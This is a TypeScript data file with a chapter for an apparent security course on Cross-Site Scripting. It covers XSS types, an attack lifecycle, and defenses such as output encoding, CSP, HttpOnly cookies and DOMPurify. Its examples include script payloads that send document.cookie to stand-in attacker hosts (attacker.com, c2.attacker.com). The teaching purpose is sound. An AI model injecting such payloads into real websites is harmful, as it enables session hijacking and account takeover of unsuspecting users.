import type { Chapter } from '../types';

export const chapter05: Chapter = {
  "id": "chapter-05",
  "number": 5,
  "romanNumeral": "V",
  "title": "Cross-Site Scripting (XSS)",
  "subtitle": "Client-Side Script Injection, Browser Exploitation, and Defense Strategies",
  "category": "Web Security",
  "readTime": "6 min read",
  "summary": "Deep-dive into Cross-Site Scripting vulnerabilities, tracing how unencoded user inputs result in browser code execution across Stored, Reflected, and DOM variants.",
  "introParagraphs": [
    "Cross-Site Scripting (XSS) is a web security attack in which an attacker causes malicious script to run in another user's browser.",
    "Because browsers trust scripts originating from the server's domain under the Same-Origin Policy, injected JavaScript can steal authentication cookies, hijack sessions, deface pages, or execute unauthorized transactions on behalf of the victim."
  ],
  "topics": [
    {
      "id": "topic-5-1",
      "number": "5.1",
      "title": "Introduction to XSS",
      "content": [
        "Cross-Site Scripting (XSS) is a web security attack in which an attacker causes malicious script to run in another user's browser.",
        "XSS \u2192 Malicious script runs in a user's browser.",
        "Unlike server-side attacks that exploit backend databases or operating system shells, XSS directly targets the client (the victim's web browser)."
      ],
      "definitions": [
        {
          "term": "Cross-Site Scripting (XSS)",
          "definition": "A client-side code injection attack where malicious scripts are injected into otherwise trusted web pages viewed by other users.",
          "keyTakeaway": "XSS \u2192 Malicious script runs in a user's browser."
        }
      ]
    },
    {
      "id": "topic-5-2",
      "number": "5.2",
      "title": "Simple Example & Exploitation Flow",
      "content": [
        "Suppose a website displays user comments without properly checking or escaping them.",
        "An attacker submits malicious script instead of a normal comment.",
        "When another user opens the page, the browser receives the script as part of the HTML response and automatically executes it."
      ],
      "diagrams": [
        {
          "title": "XSS Attack Lifecycle Flow",
          "caption": "How malicious input flows from an attacker through the web application into a victim's browser.",
          "orientation": "vertical",
          "steps": [
            {
              "label": "Attacker Crafts Payload",
              "sublabel": "<script>alert(document.cookie)</script>"
            },
            {
              "label": "Submits Malicious Input",
              "sublabel": "Payload sent to vulnerable comment form"
            },
            {
              "label": "Web Application Stores/Echoes",
              "sublabel": "Fails to sanitize or context-encode data"
            },
            {
              "label": "Victim Visits Page",
              "sublabel": "Browser renders HTML payload from trusted domain"
            },
            {
              "label": "Script Executes in Browser",
              "sublabel": "Session cookies stolen / unauthorized actions",
              "highlight": true
            }
          ]
        }
      ],
      "examples": [
        {
          "title": "Comment Form Session Hijacking",
          "scenario": "A vulnerable blog accepts user comments:",
          "breakdown": [
            {
              "label": "Injected Comment",
              "detail": "Attacker posts: <script>new Image().src='http://attacker.com/steal?c='+document.cookie;</script>"
            },
            {
              "label": "Database Storage",
              "detail": "Application saves raw string into database without HTML escaping."
            },
            {
              "label": "Execution Trigger",
              "detail": "When an administrator views the comments, the admin session cookie is silently transmitted to the attacker."
            }
          ],
          "outcome": "Attacker hijacks admin privileges without needing the administrator's password."
        }
      ]
    },
    {
      "id": "topic-5-3",
      "number": "5.3",
      "title": "Types of XSS",
      "content": [
        "Security researchers categorize Cross-Site Scripting into three distinct architectural variants based on how the malicious script is delivered:"
      ],
      "definitions": [
        {
          "term": "Stored XSS (Persistent)",
          "definition": "The injected script is permanently stored on the target servers (such as inside a database, message forum, or comment field).",
          "keyTakeaway": "Stored XSS \u2192 Malicious script is stored on the server."
        },
        {
          "term": "Reflected XSS (Non-Persistent)",
          "definition": "The injected script is reflected off a web server in immediate responses, such as in an error message or search result.",
          "keyTakeaway": "Reflected XSS \u2192 Malicious input is immediately returned by the application."
        },
        {
          "term": "DOM-Based XSS",
          "definition": "The vulnerability exists entirely in client-side code where JavaScript reads user data from a source (like window.location) and writes it unsafe to a sink.",
          "keyTakeaway": "DOM-Based XSS \u2192 Occurs through client-side JavaScript and the DOM."
        }
      ],
      "tables": [
        {
          "title": "Three Types of XSS Compared",
          "columns": [
            {
              "key": "type",
              "header": "Variant"
            },
            {
              "key": "storage",
              "header": "Storage Location"
            },
            {
              "key": "delivery",
              "header": "Delivery Mechanism"
            },
            {
              "key": "typicalSink",
              "header": "Typical Vulnerable Pattern"
            }
          ],
          "rows": [
            {
              "type": "Stored XSS",
              "storage": "Database / Server filesystem",
              "delivery": "Viewing stored posts/profiles",
              "typicalSink": "Echoing DB records directly into HTML"
            },
            {
              "type": "Reflected XSS",
              "storage": "Not stored; transient",
              "delivery": "Clicking crafted phishing URL",
              "typicalSink": "Search bar echoing query parameters"
            },
            {
              "type": "DOM-Based XSS",
              "storage": "Browser client-side DOM",
              "delivery": "Manipulating URL hash / parameters",
              "typicalSink": "Using innerHTML or eval() on location.hash"
            }
          ]
        }
      ]
    },
    {
      "id": "topic-5-4",
      "number": "5.4",
      "title": "Protection Against XSS",
      "content": [
        "Eliminating XSS requires strict context-aware output encoding, defensive input handling, and modern browser security headers.",
        "XSS Protection \u2192 Validate input and safely encode output."
      ],
      "codeSnippets": [
        {
          "language": "typescript",
          "title": "Vulnerable DOM Insertion vs Secure Safe Assignment",
          "vulnerableCode": "// INSECURE: Directly injecting raw user text into DOM HTML\nconst commentBox = document.getElementById('comment');\ncommentBox.innerHTML = userInput; // Executes <script> or <img onerror=...>",
          "secureCode": "// SECURE: Using safe textContent or sanitized contextual encoding\nconst commentBox = document.getElementById('comment');\ncommentBox.textContent = userInput; // Automatically treats input as pure text string",
          "explanation": "Using textContent forces the browser rendering engine to treat content as literal data rather than parseable HTML markup."
        }
      ],
      "examples": [
        {
          "title": "Four Layers of XSS Defense",
          "scenario": "Modern enterprise defense stack against XSS:",
          "breakdown": [
            {
              "label": "Contextual Output Encoding",
              "detail": "Convert characters like <, >, &, \", and ' into HTML entities (&lt;, &gt;, &amp;)."
            },
            {
              "label": "Input Validation",
              "detail": "Strictly validate expected types, formats, and lengths on the server."
            },
            {
              "label": "Content Security Policy (CSP)",
              "detail": "Configure HTTP header (e.g. default-src 'self') to forbid inline script execution."
            },
            {
              "label": "HttpOnly Cookies",
              "detail": "Set HttpOnly flag on session cookies so client-side JavaScript cannot read document.cookie."
            }
          ]
        }
      ],
      "keyPoints": [
        "XSS Protection \u2192 Validate input and safely encode output.",
        "Modern front-end frameworks (React, Angular) automatically escape variables in JSX/templates by default."
      ]
    }
  ],
  "quickRevision": [
    {
      "topic": "XSS",
      "summary": "Causes malicious script to run inside another user's browser."
    },
    {
      "topic": "Stored XSS",
      "summary": "Malicious script is stored permanently in backend databases or servers."
    },
    {
      "topic": "Reflected XSS",
      "summary": "Malicious payload is immediately reflected back in server responses (e.g. search fields)."
    },
    {
      "topic": "DOM-Based XSS",
      "summary": "Vulnerability occurs through client-side manipulation of the Document Object Model."
    },
    {
      "topic": "Primary Defenses",
      "summary": "Contextual output encoding, input validation, CSP headers, and HttpOnly cookies."
    }
  ],
  "rememberPoints": [
    "XSS \u2192 Malicious script runs in a user's browser",
    "Stored = In Database | Reflected = In URL Request | DOM = In Client JavaScript"
  ],
  "examQuestions": [
    {
      "question": "Compare Stored XSS, Reflected XSS, and DOM-Based XSS with delivery flowcharts.",
      "answerGuidance": "Highlight that Stored XSS persists on the server database; Reflected XSS requires the user to click a crafted link; DOM XSS never touches server processing and executes directly in client JavaScript."
    },
    {
      "question": "Why is contextual output encoding the primary countermeasure against Cross-Site Scripting?",
      "answerGuidance": "Contextual encoding translates executable control characters (like <script>) into harmless character entity representations (&lt;script&gt;), forcing the browser parser to treat them strictly as display data rather than executable script."
    }
  ],
  "attackVisualizations": [
      {
          "id": "attack-5-1",
          "title": "Stored Cross-Site Scripting (XSS) Session Hijacking",
          "attackName": "Stored XSS Cookie Theft & Account Takeover",
          "overview": "An attacker injects an unescaped JavaScript payload into a persistent database field (e.g., forum comment or profile bio), which executes inside the browser of every visitor.",
          "targetVulnerability": "Application renders user-supplied input via innerHTML without HTML entity encoding or Content Security Policy (CSP).",
          "stages": [
              {
                  "step": 1,
                  "title": "Payload Formulation & Injection",
                  "actor": "Attacker",
                  "action": "Submits forum comment containing malicious script tags",
                  "technicalDetail": "Attacker submits a comment containing a JavaScript payload designed to steal document.cookie and exfiltrate it to an external server.",
                  "color": "red",
                  "payload": "<script>fetch('https://c2.attacker.com/steal?c='+encodeURIComponent(document.cookie))</script>"
              },
              {
                  "step": 2,
                  "title": "Unsanitized Database Persistence",
                  "actor": "Application Backend",
                  "action": "Saves raw payload directly to SQL/NoSQL comments table",
                  "technicalDetail": "The server stores the comment text verbatim in the database without performing input sanitization or HTML encoding.",
                  "color": "orange"
              },
              {
                  "step": 3,
                  "title": "Victim Page Load",
                  "actor": "Victim / Administrator",
                  "action": "Navigates to the public forum thread to review comments",
                  "technicalDetail": "Victim sends GET /forum/post/42. The server responds with HTML containing the raw, unescaped stored comment string.",
                  "color": "blue"
              },
              {
                  "step": 4,
                  "title": "Browser DOM Script Execution",
                  "actor": "Victim Browser DOM Engine",
                  "action": "Parses payload as valid executable JavaScript",
                  "technicalDetail": "Because the frontend injected the comment via element.innerHTML, the HTML parser executes the <script> block within the victim's authenticated origin.",
                  "color": "red"
              },
              {
                  "step": 5,
                  "title": "Cookie Exfiltration & Session Takeover",
                  "actor": "Attacker C2 Listener",
                  "action": "Receives victim session cookie and impersonates victim",
                  "technicalDetail": "The script accesses document.cookie (lacking the HttpOnly flag) and sends the session ID to the attacker's server.",
                  "color": "red"
              },
              {
                  "step": 6,
                  "title": "HttpOnly Cookies & Contextual Encoding",
                  "actor": "Secure Browser & Framework",
                  "action": "Blocks script cookie access and neutralizes HTML tags",
                  "technicalDetail": "With HttpOnly set on session cookies, JavaScript cannot read the token. Safe frameworks (React/DOMPurify) encode <script> as safe text literals &lt;script&gt;.",
                  "color": "green"
              }
          ],
          "mitigation": {
              "title": "Multi-Layered XSS Defense Strategy",
              "rules": [
                  "Always set the HttpOnly flag on sensitive session cookies so client-side JavaScript cannot read them.",
                  "Use modern frontend frameworks (React, Vue, Angular) that automatically escape variables rendered in JSX/templates.",
                  "Sanitize rich HTML user inputs using trusted libraries like DOMPurify before inserting into the DOM.",
                  "Deploy a strict Content Security Policy (CSP) header: script-src 'self' to block inline scripts."
              ]
          }
      }
  ],
  "beforeAfterComparisons": [
      {
          "title": "DOM Rendering: Insecure innerHTML vs. Safe textContent / DOMPurify",
          "vulnerable": {
              "label": "Vulnerable: Direct innerHTML Assignment",
              "codeOrConfig": "// INSECURE: Directly rendering untrusted string into DOM\nconst commentContainer = document.getElementById('comments');\nfetch('/api/comments/123')\n  .then(res => res.json())\n  .then(data => {\n    // Vulnerable sink: executes any embedded <script> or <img onerror=...>\n    commentContainer.innerHTML = '<div class=\"comment\">' + data.text + '</div>';\n  });",
              "explanation": "innerHTML invokes the full HTML parser. If data.text contains <img src=x onerror=alert(document.cookie)>, the script executes immediately in the user's session."
          },
          "secure": {
              "label": "Secure: textContent & DOMPurify Sanitization",
              "codeOrConfig": "// SECURE: Safe DOM text node assignment or DOMPurify sanitization\nimport DOMPurify from 'dompurify';\n\nconst commentContainer = document.getElementById('comments');\nfetch('/api/comments/123')\n  .then(res => res.json())\n  .then(data => {\n    // Option A (Plain text): Browser treats string strictly as text data\n    const p = document.createElement('p');\n    p.textContent = data.text;\n    commentContainer.appendChild(p);\n\n    // Option B (Rich text): DOMPurify strips dangerous tags and handlers\n    // commentContainer.innerHTML = DOMPurify.sanitize(data.text);\n  });",
              "explanation": "textContent bypasses the HTML parser entirely and treats all characters as inert string literals. DOMPurify removes malicious event handlers and scripts if rich HTML is required."
          },
          "keyTakeaway": "Never use innerHTML to insert user-controlled data. Default to textContent, and always mark authentication cookies HttpOnly."
      }
  ],
  "handsOnPracticals": [
      {
          "id": "practical-5-1",
          "title": "Simulating Harmless DOM-Based Script Reflection & CSP Validation",
          "learningObjective": "Observe how unescaped HTML characters manipulate DOM sinks and verify how Content-Security-Policy (CSP) headers block script execution.",
          "requiredTools": [
              "python3",
              "curl",
              "modern browser"
          ],
          "environmentSetup": "Local terminal with Python 3.",
          "steps": [
              {
                  "stepNumber": 1,
                  "instruction": "Inspect how HTML entity encoding neutralizes malicious script characters.",
                  "command": "python3 -c \"import html; raw = '<script>alert(1)</script>'; print('Raw:', raw); print('Escaped:', html.escape(raw))\"",
                  "commandExplanation": "Demonstrates how <, >, and quotes are converted into safe HTML entities (&lt;, &gt;) that browsers render harmlessly as text.",
                  "expectedOutput": "Raw: <script>alert(1)</script>\nEscaped: &lt;script&gt;alert(1)&lt;/script&gt;"
              },
              {
                  "stepNumber": 2,
                  "instruction": "Audit response headers of a web endpoint to verify anti-XSS Content Security Policy (CSP) presence.",
                  "command": "curl -I -s https://www.google.com | grep -iE \"(content-security-policy|x-xss-protection|x-frame-options)\"",
                  "commandExplanation": "Extracts modern security headers that instruct browser security sandboxes to restrict script evaluation.",
                  "expectedOutput": "content-security-policy: ... script-src 'nonce-...'\nx-frame-options: SAMEORIGIN"
              },
              {
                  "stepNumber": 3,
                  "instruction": "Examine Cookie attributes to verify HttpOnly protection.",
                  "command": "curl -I -s https://github.com | grep -i \"set-cookie\" | head -n 1",
                  "commandExplanation": "Checks that session cookies include HttpOnly, Secure, and SameSite flags.",
                  "expectedOutput": "set-cookie: _gh_sess=...; Path=/; Secure; HttpOnly; SameSite=Lax"
              }
          ],
          "whatHappened": "Escaping converted active script tags into passive printable text. Modern web applications deploy strict CSP headers and HttpOnly cookie attributes to prevent script injection and cookie theft.",
          "securityLessons": [
              "Contextual output encoding is the #1 defense against Cross-Site Scripting.",
              "CSP is a defense-in-depth safety net that blocks unauthorized scripts even if injection occurs.",
              "HttpOnly cookies ensure that even if an attacker achieves XSS execution, they cannot steal session tokens."
          ],
          "prevention": [
              "Deploy Content-Security-Policy: default-src 'self'; script-src 'self'.",
              "Mark all sensitive session cookies HttpOnly; Secure; SameSite=Lax.",
              "Use React, Angular, or DOMPurify for user input rendering."
          ]
      }
  ]
};
